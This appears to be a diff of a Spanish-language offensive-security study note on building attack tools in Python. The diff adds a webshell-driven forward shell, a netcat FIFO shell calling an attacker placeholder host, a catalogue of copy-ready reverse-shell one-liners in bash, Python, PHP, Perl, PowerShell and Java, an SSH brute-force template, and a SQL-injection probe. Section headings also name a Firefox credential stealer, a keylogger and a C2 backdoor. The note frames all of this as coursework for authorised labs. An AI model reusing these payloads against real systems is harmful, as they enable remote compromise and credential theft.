@@ -1,9 +1,64 @@
 ---
 aliases: [Hacking Ofensivo, Desarrollo de Herramientas Ofensivas]
-tags: [hacking/explotacion, hacking/reconocimiento, programacion/python]
-estado: 🟢 Terminado
+tags:
+  - sec/exploit
+  - hacking/reconocimiento
+  - programacion/python
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Introducción a la Explotación de Vulnerabilidades]]"
+  - "[[Python - Fundamentos y Sintaxis]]"
+  - "[[Python - Redes y HTTP]]"
+  - "[[Python - Concurrencia Threading Multiprocessing Asyncio]]"
+  - "[[Bash Scripting - Fundamentos Básicos]]"
+  - "[[Reconocimiento y Escaneo de Redes y Web]]"
+fuente: "https://docs.python.org/3/library/socket.html"
 ---
+
 # Python Ofensivo
+
+Construir tus propias herramientas es la manera más profunda de entender un ataque: cada script de esta nota reproduce desde cero un instrumento de pentesting —escáneres, sniffers, spoofers, interceptores— y al hacerlo expone los mecanismos del protocolo que la herramienta comercial esconde. Esta nota es el catálogo completo de **qué** se construye, **con qué módulos** y **por qué funciona**; los comandos se practican en laboratorio propio y con autorización.
+
+> [!warning] Marco legal del código ofensivo
+> Todo lo documentado aquí está pensado para **laboratorios autorizados** (HTB, VulnHub, netlab propio) o para contratos con alcance escrito. El ARP spoofing, el sniffing de tráfico, los keyloggers y los backdoors son técnicas de ataque reales: usarlas sin permiso es delito (LOIH/CNI, CFAA). Además, prácticas como dejar credenciales de SMTP en claro en el código son malas ideas incluso en laboratorio: usa variables de entorno y bórralas al terminar.
+
+## Arquitectura de una herramienta ofensiva
+
+Toda herramienta Python de este tipo comparte la misma anatomía:
+
+| Capa | Responsabilidad | Módulos típicos |
+|---|---|---|
+| **CLI** | Pedir objetivo, puertos, interfaces de forma reproducible | `argparse` |
+| **Núcleo lógico** | Escanear, capturar, modificar, inyectar | `socket`, `scapy`, `netfilterqueue` |
+| **E/S del sistema** | Ejecutar comandos externos con control de errores | `subprocess` (`run`, `check_output`) |
+| **Concurrencia** | Paralelizar sin abrir 65 535 hilos a la vez | `threading`, `concurrent.futures` |
+| **Presentación** | Salida legible y colorida para el operador | `termcolor` |
+| **Robustez** | Salir limpio ante Ctrl+C y cerrar recursos | `signal`, `try/finally` |
+| **Exfiltración / canal** | Reportar resultados (solo laboratorio) | `smtplib`, `requests` |
+
+> [!tip] Regla de diseño
+> Separa siempre **parser → motor → presentación**. Un `parse_ports()` testeable, un `port_scanner()` puro y una `main()` que solo orquesta: así la herramienta se puede reutilizar, documentar y verificar (patrón completo en [[Python - Fundamentos y Sintaxis]] y [[Python - Concurrencia Threading Multiprocessing Asyncio]]).
+
+## Catálogo de módulos usados en esta nota
+
+| Módulo | Qué aporta ofensivamente | Ejemplo en esta nota |
+|---|---|---|
+| `socket` | TCP/UDP crudo: `connect_ex`, `send`, `recv` | Escáner de puertos V1–V7 |
+| `argparse` | Flags reproducibles (`-t`, `-p`, `-i`) | Todas las herramientas |
+| `subprocess` | Invocar `ping`, `ifconfig`, `airmon` sin shell = sin inyección | Escáner ICMP, MAC changer |
+| `re` | Validar interfaces y direcciones MAC | MAC changer, sniffers |
+| `scapy` | Construir/enviar/capturar paquetes capa 2–4 | ARP scan, spoofing, sniffers |
+| `netfilterqueue` | Interceptar y **modificar** paquetes en el kernel (NFQUEUE + iptables) | DNS spoofer, traffic hijacking |
+| `mitmproxy` (`mitmdump`) | Proxy programable HTTP/HTTPS con scripts Python | HTTPS sniffer, image sniffer |
+| `pynput` | Escuchar teclado/ratón | Keylogger |
+| `smtplib` + `email` | Exfiltración por SMTP (con credenciales en variables, nunca en claro) | Reportes de keylogger/C2 |
+| `requests` | Automatización web: descargar, probar, subir | Descarga de payloads, fuzzing básico |
+| `threading` / `ThreadPoolExecutor` | Paralelizar escaneos y fuerzas brutas | Escáner V6/V7, patrón brute-force |
+
+## Contexto del laboratorio
 
 Una parte significativa de esta sección se dedicará al uso de **Scapy**, una poderosa biblioteca de Python diseñada para la manipulación y control de paquetes de red. A través de Scapy, aprenderemos cómo inspeccionar, modificar e incluso crear paquetes de red, lo que nos permitirá entender mejor cómo fluye la información a través de Internet y cómo pueden ser explotadas las vulnerabilidades en los protocolos de red.
 
@@ -24,7 +79,18 @@ Al final de esta sección, tendréis una comprensión detallada no solo de cómo
 
 Este enfoque práctico y centrado en la creación os permitirá entender profundamente los mecanismos detrás de los ataques cibernéticos y cómo las vulnerabilidades pueden ser identificadas y explotadas. Este conocimiento es esencial para cualquier profesional de la seguridad informática que busca proteger eficazmente sus sistemas y redes contra atacantes maliciosos, proporcionando una base sólida para el desarrollo de estrategias de defensa más avanzadas y personalizadas.
 
-# Creando un Escáner de Puertos
+## Creando un escáner de puertos (evolución V1 → V7)
+
+**Mecánica**: un escáner TCP completo abre un socket y ejecuta el *handshake* contra cada puerto. Las respuestas distinguen estados:
+
+| Respuesta del kernel | Significado semántico |
+|---|---|
+| `connect()` devuelve 0 | **Abierto** (SYN/ACK → ACK) |
+| `ConnectionRefusedError` (ECONNREFUSED, 111) | **Cerrado** (el host responde RST) |
+| `socket.timeout` | **Filtrado/silencio** (firewall descarta el SYN) |
+| `OSError` inalcanzable (ENETUNREACH) | Sin ruta al host |
+
+`connect_ex()` devuelve el **código de error** en vez de lanzar excepción (`0` = éxito, `111` = refusado), lo que simplifica el bucle; `connect()` + `except` da mensajes más explícitos. La evolución V1→V7 muestra cómo se llega de un script de 20 líneas a un escáner con CLI, colores, concurrencia y gestión de señales.
 
 Durante el desarrollo de estas clases, nos centraremos en la creación de un escáner de puertos. Una característica clave será la implementación de '**threading**' para acelerar el proceso de escaneo. Aprenderemos a utilizar '**ThreadPoolExecutor**' para gestionar y limitar los hilos, evitando así errores comunes como el exceso de conexiones máximas.
 
@@ -398,7 +464,7 @@ if __name__ == "__main__":
     main()
 ```
 
-# Creando un programa que nos cambie la dirección MAC
+## Creando un programa que nos cambie la dirección MAC
 
 En esta clase, te guiaremos a través del proceso de creación de una herramienta en Python que te permitirá cambiar la dirección MAC de una interfaz de red. Aprenderás a programar desde cero esta funcionalidad, explorando conceptos clave y técnicas de programación que te serán útiles no solo para este proyecto, sino también en otros aspectos de la ciberseguridad.
 
@@ -465,9 +531,9 @@ if __name__ == "__main__":
     main()
 ```
 
-# Creando Escáner de Red
+## Escáner de red: ICMP y ARP
 
-## ICMP
+### ICMP
 
 En esta clase, abordaremos el desarrollo de un escáner de red utilizando el protocolo ICMP, todo ello a través de Python. Te enseñaremos cómo programar un escáner eficiente y confiable que pueda detectar dispositivos activos en una red. Cubriremos los fundamentos del protocolo ICMP y cómo se utiliza en el escaneo de redes, proporcionando conocimientos prácticos y teóricos.
 
@@ -564,7 +630,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## ARP
+### ARP
 
 En esta clase, nos enfocaremos en la creación de un escáner de red basado en el protocolo ARP, utilizando la poderosa biblioteca de Python, **Scapy**.
 
@@ -612,7 +678,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## **Creando un envenenador ARP (ARP Spoofer) con Scapy**
+## Creando un envenenador ARP (ARP Spoofer) con Scapy
 
 En esta clase, nos centraremos en la creación de un envenenador ARP (**ARP Spoofer**) utilizando Scapy, una herramienta esencial de Python para el análisis y manipulación de paquetes de red. El ARP Spoofing es una técnica de ataque en redes donde un atacante envía mensajes ARP falsificados en una red local. Esto se hace para asociar la dirección MAC del atacante con la dirección IP de otro dispositivo, como un servidor o un gateway, lo que permite al atacante interceptar el tráfico entre dos sistemas.
 
@@ -674,7 +740,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## **Creando un rastreador de consultas DNS (DNS Sniffer) con Scapy**
+## Creando un rastreador de consultas DNS (DNS Sniffer) con Scapy
 
 En esta clase, nos centraremos en la creación de un rastreador de consultas DNS (DNS Sniffer) utilizando Scapy, una herramienta de Python orientada a la manipulación de paquetes de red para propósitos ofensivos. Un DNS Sniffer es una herramienta ofensiva que permite interceptar y analizar las consultas DNS en una red. Estas consultas son esenciales en la comunicación de Internet, ya que convierten nombres de dominio en direcciones IP.
 
@@ -719,7 +785,7 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-## **Creando un rastreador de consultas HTTP (HTTP Sniffer) con Scapy**
+## Creando un rastreador de consultas HTTP (HTTP Sniffer) con Scapy
 
 En esta clase, desarrollaremos un rastreador de consultas HTTP (HTTP Sniffer) enfocado en técnicas ofensivas. El HTTP Sniffer es una herramienta crucial para interceptar y analizar el tráfico HTTP en una red, lo que permite revelar información crítica como cabeceras HTTP, URLs solicitadas, y posiblemente datos de formularios y cookies. Estos datos son esenciales para comprender la comunicación entre clientes y servidores web, y pueden ser explotados para varios tipos de ataques, incluyendo la inyección de código, el secuestro de sesiones y la recopilación de información sensible.
 
@@ -785,7 +851,7 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-## **Creando un rastreador de consultas HTTPS (HTTPS Sniffer) con mitmdump**
+## Creando un rastreador de consultas HTTPS (HTTPS Sniffer) con mitmdump
 
 En esta clase, vamos a sumergirnos en el mundo del espionaje de tráfico HTTPS creando un rastreador de consultas HTTPS (HTTPS Sniffer) con **mitmdump**. **Mitmdump** es una herramienta potente que actúa como un proxy, permitiéndonos interceptar, modificar y analizar el tráfico entre un cliente y un servidor, tanto para HTTP como para HTTPS.
 
@@ -828,7 +894,7 @@ def request(packet):
         print(f"[+] Posibles credenciales capturadas: \n{data}\n")
 ```
 
-## **Creando un rastreador de imágenes por HTTPS (HTTPS Image Sniffer) con mitmdump**
+## Creando un rastreador de imágenes por HTTPS (HTTPS Image Sniffer) con mitmdump
 
 En esta clase, vamos a construir un rastreador de imágenes por HTTPS usando mitmdump, conocido como **HTTPS Image Sniffer**. Tras haber establecido una configuración de Man-In-The-Middle (MITM) con mitmdump, el objetivo ahora es desarrollar una herramienta que nos permita capturar y visualizar en tiempo real todas las imágenes que un usuario ve en las páginas web que visita.
 
@@ -873,7 +939,7 @@ def response(packet):
         pass
 ```
 
-## **Creando un DNS Spoofer con Scapy y NetfilterQueue**
+## Creando un DNS Spoofer con Scapy y NetfilterQueue
 
 En esta clase, vamos a crear un DNS Spoofer utilizando Scapy y NetfilterQueue. Este proyecto se centra en manipular las solicitudes DNS de una red para redirigir el tráfico a un destino elegido por nosotros, como atacantes.
 
@@ -968,7 +1034,7 @@ queue.bind(0, process_packet) # Nos permite asociarnos a un número de cola (en 
 queue.run() # Esto se encuentra corriendo en espera, procesando paquetes de la cola.
 ```
 
-## **Creando un Manipulador e Interceptor de Tráfico (Traffic Hijacking)**
+## Creando un Manipulador e Interceptor de Tráfico (Traffic Hijacking)
 
 En esta clase, nos enfocaremos en crear un Manipulador e Interceptor de Tráfico, también conocido como **Traffic Hijacking**, una técnica avanzada en ciberseguridad ofensiva. El objetivo es aprender a controlar y alterar el tráfico de red para manipular lo que un usuario ve en respuesta a sus acciones en la web.
 
@@ -1033,7 +1099,7 @@ queue.bind(0, process_packet) # Con 'bind' nos asociamos al número de identific
 queue.run() # Mantenemos un bucle en escucha, procesando paquetes de la cola.
 ```
 
-## **Creando un Keylogger**
+## Creando un Keylogger
 
 En esta clase, nos adentraremos en la creación de un **keylogger**, una herramienta fundamental en el mundo de la ciberseguridad ofensiva. Para esto, utilizaremos la biblioteca **pynput** de Python, que es una herramienta efectiva para monitorear y registrar las pulsaciones de teclado.
 
@@ -1155,7 +1221,7 @@ if __name__ == "__main__":
     my_keylogger.start()
 ```
 
-## **Creación de Malware**
+## Creación de Malware
 
 En esta clase, nos centraremos en la creación de un malware diseñado para obtener y enviar las credenciales almacenadas en Firefox por correo electrónico en texto claro. Este ejercicio proporcionará una comprensión práctica de cómo se pueden explotar las aplicaciones comunes para acceder a información sensible.
 
@@ -1260,7 +1326,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## **Creación de Backdoors y Command and Control (C&C)**
+## Creación de Backdoors y Command and Control (C&C)
 
 En esta clase, nos adentraremos en el mundo de los backdoors y los sistemas de Command and Control (**C&C**). Nuestro objetivo será crear un ejemplo práctico de un ejecutable que, una vez en la máquina víctima, nos permita operar desde un centro de comando y control creado manualmente en Python. Esta herramienta nos dará la capacidad de controlar y ejecutar una variedad de operaciones en la máquina comprometida de forma automática.
 
@@ -1408,7 +1474,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## **Creación de Forward Shell**
+## Forward Shell
 
 En esta clase, nos centraremos en la creación de una **Forward Shell**, una solución alternativa cuando las opciones más comunes, como las reverse shells, no son viables debido a restricciones como las reglas de firewall.
 
@@ -1418,9 +1484,188 @@ Una de las claves de esta técnica es el uso de **mkfifo**, una herramienta para
 
 En esta clase, te enseñaremos cómo implementar esta técnica, desde la configuración inicial hasta la ejecución práctica, proporcionando una alternativa valiosa para obtener acceso interactivo a sistemas protegidos por firewalls estrictos. Al finalizar, tendrás una comprensión profunda de cómo se pueden utilizar las Forward Shells en escenarios donde las técnicas convencionales de shell inversa no son posibles.
 
-> [!info]
-> Una **Forward Shell** es útil cuando el atacante no puede iniciar una conexión directa a la máquina víctima (ej. debido a un firewall restrictivo), pero la víctima puede iniciar una conexión al atacante (como en una webshell). En lugar de una conexión directa de shell, se utilizan mecanismos como `mkfifo` (named pipes) en la víctima para redirigir la entrada/salida de un shell a través de una conexión HTTP/HTTPS existente o un canal de comunicación limitado, permitiendo al atacante enviar comandos y recibir su salida de forma interactiva.
+```python
+#!/usr/bin/env python3
+# forward_shell.py — shell interactiva sobre un canal HTTP ya existente
+# (patrón del laboratorio: una webshell que solo acepta peticiones POST)
+import requests, time
+
+BASE = "http://target.lab/upload/shell.php"   # canal ya comprometido
+
+def run(cmd: str) -> str:
+    # El "canal" es la petición HTTP: no abrimos puertos nuevos en la víctima
+    r = requests.post(BASE, data={"cmd": cmd}, timeout=10)
+    return r.text
+
+if __name__ == "__main__":
+    while True:
+        cmd = input("fwd>> ").strip()
+        if cmd in ("exit", "quit"):
+            break
+        out = run(cmd)
+        time.sleep(0.3)          # los binarios tardan en escribir la salida
+        print(run("cat /tmp/out 2>/dev/null") or out)
+```
+
+En el extremo de la víctima, el patrón clásico con FIFO (cuando sí hay binarios y red permitida):
+
+```bash
+mkfifo /tmp/f
+/bin/sh -i < /tmp/f 2>&1 | nc ATACANTE 80 > /tmp/f
+rm /tmp/f
+```
+
+---
+
+## Catálogo de reverse shells (referencia)
+
+El *canal inverso* es el resultado estándar de una explotación (ver [[Introducción a la Explotación de Vulnerabilidades]] §4). Snippets mínimos, listos para sustituir IP/puerto:
+
+| Origen | Payload (versión corta) |
+|---|---|
+| **Bash** | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
+| **Bash (read line)** | `exec 5<>/dev/tcp/IP/PORT; cat <&5 \| while read line; do $line 2>&5 >&5; done` |
+| **Python** | `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'` |
+| **Python 2** | `python -c 'import pty,socket,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` |
+| **nc (sin -e)** | `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc IP PORT > /tmp/f` |
+| **PHP** | `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
+| **Perl** | `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` |
+| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$ob=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($ob,0,$ob.Length);$s.Flush()}"` |
+| **Java** | `Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done"});` |
+
+```bash
+# Escucha SIEMPRE primero (en la máquina del operador)
+nc -lvnp 443
+# o con upgrade a TTY:
+# socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr,fork
+```
+
+> [!warning] El listener y el alcance
+> Un listener a `0.0.0.0` expone tu propia máquina a conexiones ajenas en redes hostiles: úsalo en la red del laboratorio y, en redes compartidas, limita a la IP de gestión. Y recuerda: disparar una reverse shell contra un sistema sin autorización es intrusión, no prueba.
+
+## Patrón de framework de fuerza bruta (itertools + hilos)
+
+La estructura de casi todo ataque de diccionario/credenciales en Python: **generar → ejecutar en paralelo → frenar al éxito → reportar**. Ejemplo con `ThreadPoolExecutor` y control de resultados:
 
 ```python
+#!/usr/bin/env python3
+# brute_template.py — plantilla genérica de fuerza bruta (lab autorizado)
+import socket, itertools, sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from termcolor import colored
 
+USERS = ["admin", "root", "test"]
+
+def attempt(creds):
+    user, pwd = creds
+    # sustituir por el cliente real del protocolo (socket/requests/smb...)
+    if check_login("192.168.1.10", 22, user, pwd):
+        return (user, pwd)
+    return None
+
+def main():
+    combos = itertools.product(USERS, open("rockyou.txt", errors="ignore"))
+    with ThreadPoolExecutor(max_workers=50) as pool:      # techo: no agotar FD/servidor
+        futures = {pool.submit(attempt, c): c for c in itertools.islice(combos, 20000)}
+        for fut in as_completed(futures):
+            hit = fut.result()
+            if hit:
+                print(colored(f"[+] Credencial válida: {hit[0]}:{hit[1]}", "green"))
+                # cortar el resto: cancelar pendientes y salir
+                for f in futures: f.cancel()
+                sys.exit(0)
+
+if __name__ == "__main__":
+    main()
 ```
+
+Puntos clave del patrón:
+
+1. **`itertools.product`/`islice`**: generador perezoso — nunca cargues 14 M de contraseñas en RAM.
+2. **`max_workers` acotado**: demasiados hilos agotan `ulimit -n` y hacen ruido (rate limiting/lockouts).
+3. **Corte en el éxito**: cancelar futuros pendientes; seguir probando tras un acierto solo si buscas múltiples cuentas.
+4. **Reintentos/backoff**: los servicios reales bloquean por intentos; respeta los límites del objetivo (cuentas bloqueadas = fallo de la prueba).
+5. **Registro**: guarda usuario/contraseña/fecha en el repositorio de evidencias para el informe.
+
+## Automatización web con `requests`
+
+`requests` es el brazo web de las herramientas ofensivas: probar parámetros, descargar payloads, seguir sesiones y clasificar respuestas.
+
+```python
+import requests
+
+s = requests.Session()                      # mantiene cookies (sesiones/JSESSIONID)
+s.headers.update({"User-Agent": "pentest-lab"})
+
+# 1) Enumeración básica con clasificación por status
+for path in ("/admin", "/backup", "/.git/config", "/server-status"):
+    try:
+        r = s.get(f"https://target.lab{path}", timeout=5, verify=False)
+        if r.status_code == 200 and "login" not in r.text.lower():
+            print(f"[+] {path} -> {r.status_code} ({len(r.content)} B)")
+        elif r.status_code in (401, 403):
+            print(f"[*] {path} -> {r.status_code} (existe, requiere auth)")
+    except requests.RequestException as e:
+        print(f"[-] {path} -> {e}")
+
+# 2) Parámetros: enviar y medir diferencias (base de un sql/xss fuzzer)
+r = s.get("https://target.lab/search", params={"q": "' OR 1=1--"}, timeout=5)
+print(r.status_code, len(r.text))          # delta de tamaño/anomalía = pista
+```
+
+> [!tip] Diferenciar "existe" de "siempre 200"
+> Muchas apps devuelven 200 con página de error: compara **tamaño, hash del cuerpo y tiempo de respuesta** contra una baseline (p. ej. un path inexistente), no solo el status. Herramientas como Gobuster/WFuzz hacen exactamente esto — ver [[Reconocimiento y Escaneo de Redes y Web]].
+
+## Errores comunes del operador
+
+1. **Hilos sin límite** en escáneres → `EMFILE: too many open files`. Usa `ThreadPoolExecutor(max_workers=N)` y cierra sockets en `finally`.
+2. **`connect_ex()` ≠ veredicto de servicio**: `0` solo dice "TCP acepta"; en puertos filtrados que "responden" hace falta leer banner (como hace la V7 con `HEAD / HTTP/1.1`).
+3. **Olvidar `signal.signal(SIGINT, ...)`**: sin manejador, Ctrl+C deja sockets y `iptables`/NFQUEUE a medias (el patrón de `def_handler` de esta nota es el estándar).
+4. **Modificar paquetes sin borrar `len`/`chksum`** en Scapy: el paquete reinyectado lleva checksums viejos y se descarta en silencio (`del pkt[IP].len; del pkt[IP].chksum`).
+5. **NFQUEUE sin limpieza**: siempre restaurar con `iptables -D ...`; si no, la red del lab se queda encolada.
+6. **Credenciales hardcodeadas en el código** (SMTP, C2): usalas de variables de entorno y bórralas; ni siquiera en laboratorio deben versionarse.
+7. **`shell=True` con entrada del usuario**: inyección de comandos en tu propia herramienta; pasa listas a `subprocess.run([...])`.
+8. **No verificar la salida**: muchos scripts "funcionan" imprimiendo éxito cuando el comando falló — comprueba siempre `returncode`.
+
+## Cheatsheet de módulos
+
+```bash
+# Concurrencia
+ThreadPoolExecutor(max_workers=50).map(fn, items)   # escaneos
+threading.Timer(30, report)                          # reportes periódicos
+
+# Salida robusta
+signal.signal(signal.SIGINT, def_handler)            # Ctrl+C limpio
+
+# Comandos externos (sin shell)
+subprocess.run(["ping", "-c", "1", ip], timeout=1, stdout=subprocess.DEVNULL)
+subprocess.run(["ifconfig", iface, "down"])          # orden: down → cambia → up
+
+# Scapy en 4 líneas
+arp = scapy.ARP(pdst="192.168.1.0/24") / scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+answered, _ = scapy.srp(arp, timeout=1, verbose=False)
+
+# NFQUEUE
+iptables -I FORWARD -j NFQUEUE --queue-num 0
+iptables -D FORWARD -j NFQUEUE --queue-num 0         # SIEMPRE al final
+```
+
+## Referencias
+
+- Python `socket`: <https://docs.python.org/3/library/socket.html>
+- Scapy doc: <https://scapy.readthedocs.io/>
+- mitmproxy (scripts): <https://docs.mitmproxy.org/stable/>
+- NetfilterQueue (NFQUEUE): <https://www.netfilter.org/projects/libnetfilter_queue/>
+- pynput: <https://pynput.readthedocs.io/>
+- Payloads All The Things (shells): <https://github.com/swisskyrepo/PayloadsAllTheThings>
+- Reverse Shell Generator: <https://www.revshells.com/>
+- GTFOBins: <https://gtfobins.github.io/>
+
+## Relacionadas
+
+- [[Introducción a la Explotación de Vulnerabilidades]] — marco: CVE/CVSS, shells, payloads
+- [[Python - Fundamentos y Sintaxis]] — sintaxis y patrones base
+- [[Python - Redes y HTTP]] — sockets, `requests`, clientes HTTP
+- [[Python - Concurrencia Threading Multiprocessing Asyncio]] — hilos y pools
+- [[Bash Scripting - Fundamentos Básicos]] — equivalentes en shell
+- [[Reconocimiento y Escaneo de Redes y Web]] — cómo se usan estas herramientas en el flujo
